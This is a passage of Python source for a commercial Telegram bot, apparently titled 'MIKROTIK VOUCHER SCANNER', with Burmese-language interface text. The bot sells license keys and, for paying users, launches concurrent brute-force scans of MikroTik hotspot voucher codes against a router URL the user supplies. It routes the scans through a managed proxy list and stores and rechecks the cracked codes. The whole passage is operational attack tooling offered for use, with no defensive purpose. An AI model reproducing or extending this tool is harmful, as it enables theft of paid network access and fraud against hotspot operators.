            text=f"✅ Mode: `{MIKROTIK_MODES[mode]['label']}`\n\nSTART SCAN နှိပ်ပါ။",
            reply_markup=get_start_scam_keyboard(), parse_mode="Markdown"
        )
        await bot.answer_callback_query(call.id)
        return

    if data == "menu_start_scam":
        global active_scans_count
        async with active_scans_lock:
            if active_scans_count >= MAX_CONCURRENT_SCANS:
                await bot.edit_message_text(
                    chat_id=chat_id, message_id=call.message.message_id,
                    text=f"⚠️ Bot busy ({active_scans_count}/{MAX_CONCURRENT_SCANS})",
                    reply_markup=get_back_keyboard()
                )
                await bot.answer_callback_query(call.id)
                return
            active_scans_count += 1

        if 'selected_mode' not in ud:
            await bot.edit_message_text(
                chat_id=chat_id, message_id=call.message.message_id,
                text="❌ Mode မရွေးရသေးပါ။", reply_markup=get_voucher_keyboard()
            )
            await bot.answer_callback_query(call.id)
            async with active_scans_lock:
                active_scans_count = max(0, active_scans_count - 1)
            return

        if 'session_url' not in ud:
            await bot.edit_message_text(
                chat_id=chat_id, message_id=call.message.message_id,
                text="❌ Router URL မထည့်ရသေးပါ။", reply_markup=get_back_keyboard()
            )
            await bot.answer_callback_query(call.id)
            async with active_scans_lock:
                active_scans_count = max(0, active_scans_count - 1)
            return

        if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
            await bot.edit_message_text(
                chat_id=chat_id, message_id=call.message.message_id,
                text="⚠️ Scan လုပ်နေပြီ။", reply_markup=get_start_scam_keyboard()
            )
            await bot.answer_callback_query(call.id)
            async with active_scans_lock:
                active_scans_count = max(0, active_scans_count - 1)
            return

        mode = ud['selected_mode']
        start_digit = ud.get('start_digit')

        progress_msg = await bot.send_message(chat_id, """⏹️ **SCANNING...**
━━━━━━━━━━━━━━━━━━
📊 Tried: 0
🔢 Code: ...
✅ Hits: 0
⚡ Speed: 0 c/m
🌐 Proxies: 0
🎯 Mode: ...
━━━━━━━━━━━━━━━━━━
📌 Hits: None""")
        scan_id = str(uuid.uuid4())

        task = asyncio.create_task(run_bruteforce(
            mode, chat_id, ud['session_url'], scan_id,
            progress_msg=progress_msg, start_digit=start_digit
        ))

        scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}
        await bot.answer_callback_query(call.id)
        return

    if data == "menu_stop":
        d = scan_tasks.get(chat_id)
        if d and not d["task"].done():
            d["stop"] = True
            d["task"].cancel()
            scan_tasks.pop(chat_id, None)
            await bot.edit_message_text(
                chat_id=chat_id, message_id=call.message.message_id,
                text="🛑 **Stopped**", reply_markup=get_main_keyboard(chat_id)
            )
        await bot.answer_callback_query(call.id, "Stopped", show_alert=False)
        return

    if data == "menu_result":
        codes = success_texts.get(chat_id, [])
        txt = "\n".join(codes) if codes else "Code မရှိသေးပါ။"
        await bot.edit_message_text(
            chat_id=chat_id, message_id=call.message.message_id,
            text=f"📦 **Saved Codes**\n\n{txt}",
            reply_markup=get_back_keyboard()
        )
        await bot.answer_callback_query(call.id)
        return

    if data == "menu_recheck":
        if 'session_url' not in ud:
            await bot.edit_message_text(
                chat_id=chat_id, message_id=call.message.message_id,
                text="❌ Router URL မထည့်ရသေးပါ။", reply_markup=get_back_keyboard()
            )
            await bot.answer_callback_query(call.id)
            return
        await bot.edit_message_text(
            chat_id=chat_id, message_id=call.message.message_id,
            text="🔄 Rechecking...", reply_markup=get_back_keyboard()
        )
        asyncio.create_task(recheck_command(call.message))
        await bot.answer_callback_query(call.id)
        return

# ==================== TEXT HANDLER ====================
@bot.message_handler(func=lambda message: message.text and not message.text.startswith('/'))
async def handle_text(message):
    chat_id = message.chat.id
    user_id = str(chat_id)
    text = message.text.strip()

    if chat_id not in user_data:
        user_data[chat_id] = {}
    ud = user_data[chat_id]
    state = ud.get('state')

    # ===== KEY ENTRY =====
    if state == 'waiting_for_key':
        keys = load_json_file(KEY_FILE)
        if text in keys:
            info = keys[text]
            del keys[text]
            save_json_file(KEY_FILE, keys)

            lic = get_user_license_status(chat_id)
            cur_exp = lic['expiry_ts']

            if cur_exp == float('inf'):
                base = time.time()
            elif cur_exp > time.time():
                base = cur_exp
            else:
                base = time.time()

            new_exp = base + info['duration_sec']

            licenses = load_json_file(LICENSE_FILE)
            licenses[str(chat_id)] = {
                'expiry': new_exp,
                'plan': info['label'],
                'activated_at': time.time(),
                'key_used': text
            }
            save_json_file(LICENSE_FILE, licenses)

            ud['state'] = None
            new_lic = get_user_license_status(chat_id)

            await bot.reply_to(
                message,
                f"""🎉 **Key အောင်မြင်စွာ အသက်ဝင်သွားပါပြီ!**

━━━━━━━━━━━━━━━━━━
📦 Plan: `{info['label']}`
━━━━━━━━━━━━━━━━━━
⏰ **ကုန်ဆုံးမည့်ရက်:**
`{new_lic['expiry_full']}`

⏳ **ကျန်ရှိချိန်:**
**{new_lic['remaining']}**
━━━━━━━━━━━━━━━━━━

✅ ယခုမှစ၍ Bot ကို အသုံးပြုနိုင်ပါပြီ။""",
                reply_markup=get_main_keyboard(chat_id),
                parse_mode="Markdown"
            )
        else:
            await bot.reply_to(
                message,
                "❌ **Key မှားနေပါသည် (သို့) အသုံးပြုနိုင်တော့ပါ။**",
                parse_mode="Markdown"
            )
        return

    lic = get_user_license_status(chat_id)
    if not lic["is_valid"] and user_id not in ADMINS:
        return

    if state == 'waiting_for_portal_url':
        if not text.startswith("http"):
            await bot.reply_to(message, "❌ `http://` နဲ့စပါ။ ဥပမာ `http://192.168.88.1`")
            return
        ud['session_url'] = normalize_router_url(text)
        ud['state'] = None
        await bot.reply_to(
            message,
            f"✅ **Router URL saved!**\n\n`{ud['session_url']}`\n\nMode ရွေးပြီး START SCAN နှိပ်ပါ။",
            reply_markup=get_voucher_keyboard(),
            parse_mode="Markdown"
        )
        return

    if state == 'waiting_for_proxy_text' and user_id in ADMINS:
        lines = [l.strip() for l in text.splitlines() if l.strip()]
        if not lines:
            await bot.reply_to(message, "❌ Proxy များ ဗလာဖြစ်နေပါသည်။")
            return

        added = add_proxies(lines)
        ud['state'] = None

        await bot.reply_to(
            message,
            f"✅ **Proxy ထည့်ပြီးပါပြီ**\n\n"
            f"➕ Added: `{added}`\n"
            f"📊 Total: `{len(PROXY_LIST)}`",
            reply_markup=get_admin_keyboard(), parse_mode="Markdown"
        )
        return

    if text.startswith("http"):
        ud['session_url'] = normalize_router_url(text)
        await bot.reply_to(message, "✅ Router URL saved!", reply_markup=get_voucher_keyboard())
        return

# ==================== RECHECK ====================
async def recheck_command(message):
    chat_id = message.chat.id
    codes = success_texts.get(chat_id, [])
    if not codes:
        await bot.send_message(chat_id, "Code မရှိသေးပါ။")
        return
    ud = user_data.get(chat_id, {})
    if 'session_url' not in ud:
        await bot.send_message(chat_id, "Router URL မရှိပါ။")
        return
    recheck_list = []
    for hit in codes:
        code = hit.split(" ")[0].strip("`")
        rc = await perform_check(ud['session_url'], code, chat_id, scan_id=None, recheck=True)
        if rc == code:
            recheck_list.append(f"✅ `{code}`")
        else:
            recheck_list.append(f"❌ `{code}`")
    txt = "\n".join(recheck_list)
    await bot.send_message(chat_id, f"🔄 **Recheck Results:**\n\n{txt}", parse_mode="Markdown")

# ==================== LICENSE CHECKER ====================
async def license_expiry_checker():
    while True:
        await asyncio.sleep(60)
        try:
            licenses = load_json_file(LICENSE_FILE)
            now = time.time()
            for uid_str, data in list(licenses.items()):
                expiry = data.get('expiry', 0)

                if 0 < expiry - now <= 300:
                    try:
                        uid = int(uid_str)
                        if uid in user_data:
                            ud = user_data[uid]
                            if not ud.get('expiry_warned'):
                                await bot.send_message(
                                    uid,
                                    f"⚠️ **သက်တမ်းကုန်ခါနီးပါပြီ!**\n\n"
                                    f"⏳ ကျန်ရှိချိန်: **{format_remaining_time(expiry)}**\n"
                                    f"📅 ကုန်ဆုံးမည့်အချိန်: `{format_expiry_full(expiry)}`\n\n"
                                    f"👨‍💻 {ADMIN_CONTACT}",
                                    parse_mode="Markdown"
                                )
                                ud['expiry_warned'] = True
                    except:
                        pass
                elif expiry > 0 and expiry <= now:
                    try:
                        uid = int(uid_str)
                        if uid in scan_tasks:
                            d = scan_tasks[uid]
                            if not d["task"].done():
                                d["stop"] = True
                                d["task"].cancel()
                            scan_tasks.pop(uid, None)
                    except:
                        pass
        except Exception as e:
            print(f"[license_checker] Error: {e}")

# ==================== POLLING ====================
async def start_polling():
    backoff = 5
    while True:
        try:
            await bot.infinity_polling(timeout=20, request_timeout=20)
            return
        except Exception as e:
            print(f"Polling error: {e}. Retry in {backoff}s")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)

async def main():
    global session, _connector
    _connector = aiohttp.TCPConnector(limit=20000, limit_per_host=10000, ttl_dns_cache=300, ssl=False)
    session = aiohttp.ClientSession(connector=_connector, connector_owner=False, timeout=aiohttp.ClientTimeout(total=30))

    load_proxies_from_file()
    print(f"✅ Loaded {len(PROXY_LIST)} proxies")

    asyncio.create_task(web_server())
    asyncio.create_task(license_expiry_checker())
    await start_polling()

if __name__ == '__main__':
    print("=" * 55)
    print("   🎯 MIKROTIK VOUCHER SCANNER 🎯")
    print("        Telegram: @Dizzy7000")
    print("=" * 55)
    print("👑 Owner: Dizzy7000")
    print("📡 Target: Mikrotik Hotspot")
    print("🎯 Modes: 17 modes available")
    print("=" * 55)
    asyncio.run(main())